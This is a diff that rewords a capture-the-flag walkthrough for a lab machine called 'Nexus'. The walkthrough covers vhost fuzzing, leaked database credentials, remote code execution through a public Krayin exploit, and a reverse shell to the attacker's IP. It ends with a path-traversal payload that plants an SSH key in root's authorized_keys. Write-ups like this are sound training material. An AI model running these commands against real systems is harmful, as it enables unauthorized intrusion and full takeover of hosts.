@@ -52,16 +52,16 @@ IP ID Sequence Generation: All zeros
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 ```
-- Added nexus.htb to host file - Navigating to port 80 presents us with web page for Nexus Energy Authority
-- ![http](images/Nexus-1.png)
-- Reviewing the website provides us with a job posting
-- ![http](images/nexus-2.png)
-- reviewing the job posting, we see that there is an apply and potential user
-- ![http](images/nexus-3.png)
+- Added nexus.htb to host file - Navigating to port 80 presents with web page for Nexus Energy Authority
+![http](images/Nexus-1.png)
+- Reviewing the website provides a job posting
+![http](images/nexus-2.png)
+- Reviewing the job posting, an apply option and potential user are located
+![http](images/nexus-3.png)
 
 
 ## Enumeration
-- Using ffuf we fuzz for vhosts and locate git.nexus.htb
+- Using ffuf for vhosts enumeration was able to locate git.nexus.htb
 ```
 ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt:FUZZ -u http://nexus.htb -H 'Host: FUZZ.nexus.htb' -c -ac
 
@@ -92,8 +92,8 @@ billing                 [Status: 302, Size: 390, Words: 60, Lines: 12, Duration:
 ```
 - Navigating to website confirms presence of gitea
 ![http](images/nexus-4.png)
-- Clicking on Explore takes us to a public repository
-- ![http](images/nexus-5.png)
+- Clicking on Explore redirects to a public repository
+![http](images/nexus-5.png)
 - Reviewing repository exposes docker.yml file
 ```yaml
 version: '3.1'
@@ -148,32 +148,32 @@ services:
 volumes:
   dbvolume:
 ```
-- Checking the changes and notifications, we see the password for the database
-- ![http](images/nexus-6.png)
+- Checking the changes and notifications expose the password for the database
+![http](images/nexus-6.png)
 - Navigating to billing.nexus.htb reveals Krayin sign-in portal (confirmed mysql backend)
-- ![http](images/nexus-7.png)
+![http](images/nexus-7.png)
 - There is a banner at the bottom that shows messages and potential leaked information about the page
-- ![http](images/nexus-8.png)
-- Testing login with our potential user and the password we discovered allows us to log in successfully
-- ![http](images/nexus-9.png)
-- We get the version from checking out user profile
-- ![http](images/nexus-10.png)
-- Searching for an exploit we locate CVE-2026-38526
-- https://www.exploit-db.com/exploits/52629
-- We download the exploit and check for parameters
+![http](images/nexus-8.png)
+- Testing login with our potential user and the password allows a successful login
+![http](images/nexus-9.png)
+- Version of the application is located from checking the user profile
+![http](images/nexus-10.png)
+- Searching for an exploit provides CVE-2026-38526
+https://www.exploit-db.com/exploits/52629
+- Reviewing of the public exploit confirms requirements
 ```shell
   python3 52629.py                             
 usage: 52629.py [-h] -t TARGET -u USER -p PASSWORD -f FILE
 52629.py: error: the following arguments are required: -t/--target, -u/--user, -p/--password, -f/--file
 ```
-- We will need a php webshell - We can use this public exploit as well to have it run commands without a file (https://github.com/NathanHimself/CVE-2026-38526-PoC)
+- A php webshell if needed - Modification of the public exploit to have it run commands without a file (https://github.com/NathanHimself/CVE-2026-38526-PoC)
 ```shell
 python3 exploit.py -t http://billing.nexus.htb -u j.matthew@nexus.htb -p '<REDACTED>' -c whoami
 www-data
 ```
 
 ## Initial Foothold
-- Once we confirmed we have remote code execution, we update our command to gain a reverse shell
+- With confirmation of remote code execution, an update to the command provides a reverse shell
 ```shell
 python3 exploit.py -t http://billing.nexus.htb -u j.matthew@nexus.htb -p '<REDACTED>' -c "bash -c 'bash -i >& /dev/tcp/10.10.16.97/9001 0>&1'"
 ```
@@ -191,7 +191,7 @@ www-data@nexus:~/krayin/storage/app/public/tinymce$
 ```
 
 ## Privilege Escalation
-- Once we have a stable shell, we enumerate the website and look for any database and credentials
+- With a stable shell, further enumeration of the website to look for any database and credentials is needed
 - Locating the .env file in the Krayon directory, exposes the database credentials
 ```shell
 DB_CONNECTION=mysql
@@ -202,10 +202,10 @@ DB_USERNAME=krayin
 DB_PASSWORD=<REDACTED>
 DB_PREFIX=
 ```
-- We then check for users on the box and locate a user jones in the /etc/passwd file
-- since the last database password allowed access, we will try to SSH with this new password for user jones (we get access)
-- ![http](images/nexus-11.png)
-- We then upload linpeas via wget and change to executable and run
+- Enumeration of users on the box locates a user jones in the /etc/passwd file
+- Since the last database password allowed access, logic dictatesSSH with this new password for user jones may be possible (successful)
+![http](images/nexus-11.png)
+- Upload linpeas via wget and change to executable
 ```shell
 jones@nexus:~$ wget http://10.10.16.97:8000/linpeas.sh
 --2026-07-25 20:58:18--  http://10.10.16.97:8000/linpeas.sh
@@ -224,7 +224,7 @@ jones@nexus:~$ chmod +x linpeas.sh
 jones@nexus:~$ ./linpeas.sh 
 ```
 - Linpeas identified potential capabilities privilege escalation
-- ![http](images/nexus-12.png)
+![http](images/nexus-12.png)
 - Confirmed by running getcap on /usr/lib/snapd/snap-confie and seeing cap_dac_override
 ```shell
 jones@nexus:~$ getcap /usr/lib/snapd/snap-confine
@@ -264,8 +264,8 @@ apt install gcc
 Please ask your administrator.
 ```
 - Uploaded pspy to check for processes and any running tasks (located interesting systemd timer)
-- ![http](images/nexus-13.png)
-- ran command to check timers and located a gitea sync timer
+![http](images/nexus-13.png)
+- Running command to check timers and located a gitea sync timer
 ```shell
 jones@nexus:~$ systemctl list-timers
 NEXT                            LEFT LAST                              PASSED UNIT                           >
@@ -289,7 +289,7 @@ Mon 2026-07-27 01:36:31 UTC 1 day 4h Sat 2026-07-25 20:16:09 UTC  1h 6min ago fs
 16 timers listed.
 ```
 - Located /etc/gitea directory - Navigating and enumerating this directory exposed template-sync.py
-- ![http](images/nexus-14.png)
+![http](images/nexus-14.png)
 - Reviewing the code confirms there is an exploit in the way the script using the git ls-tree command and gets the raw file path without sanitization
 ```python
 # Extract files to staging directory
@@ -323,22 +323,22 @@ Mon 2026-07-27 01:36:31 UTC 1 day 4h Sat 2026-07-25 20:16:09 UTC  1h 6min ago fs
 
 ```
 
-- From here, we can create a repo and create a python script to add SSH keygen to authorized_keys
-- We first see if we can log in as jones in gitea (successful)
-- Then we create a new repo (you can name this anything, lets be stealthy and name it "KrayinUpdate")
-- ![http](images/nexus-15.png)
-- We also want to make sure we make a repository a template
-- ![http](images/nexus-16.png)
-- Then we need to generate a ssh key
+- From here, a repository is setup and python script created to add SSH keygen to authorized_keys
+- Access to the website as jones in gitea (successful)
+- Naming the repository (you can name this anything, lets be stealthy and name it "KrayinUpdate")
+![http](images/nexus-15.png)
+- Ensuring a repository a template is checked
+![http](images/nexus-16.png)
+- Generating an SSH Key
 ```shell
 ssh-keygen -t ed25519 -f /tmp/.k -N ''
 ```
-- We then create a README.md file 
+- A README.md file is required
 ```shell
 touch README.md
 ```
 
-- We need to travers up to the root and then down to authorized_keys - we can use the below python script to automate the traversal payload
+- The goal of travers up to the root and then down to authorized_keys is accomplished by using the below python script to automate the traversal payload
 ```python
 # build.py
 #!/usr/bin/env python3
@@ -448,7 +448,7 @@ print("Done: " + sha)
 python3 build.py
 Done: 7178219d4cdb95e5ece4fb90e9a2b10db328f7ee
 ```
-- We then push the changes to the repo
+- With the script completed, the changes can be pushed to the repository
 ```shell
 git push -u origin main --force                                              
 Enumerating objects: 11, done.
@@ -464,7 +464,7 @@ To http://git.nexus.htb/jones/KrayinUpdate.git
 branch 'main' set up to track 'origin/main'.
 ```
 
-- Then we wait for the sync timer - After a few minutes, we check the logs and see our update
+- Waiting for the sync timer - After a few minutes, logs confirm changes were uploaded
 ```shell
 [2026-07-25 21:50:35] Found 1 template repo(s)
 [2026-07-25 21:50:35] Syncing template: jones/KrayinUpdate
@@ -484,7 +484,7 @@ branch 'main' set up to track 'origin/main'.
 
 ```
 
-- We can then SSH as root and get the flag
+- SSH as root and get the flag
 ```shell
 ssh -i /tmp/.k root@nexus.htb           
 Welcome to Ubuntu 24.04.4 LTS (GNU/Linux 6.8.0-111-generic x86_64)
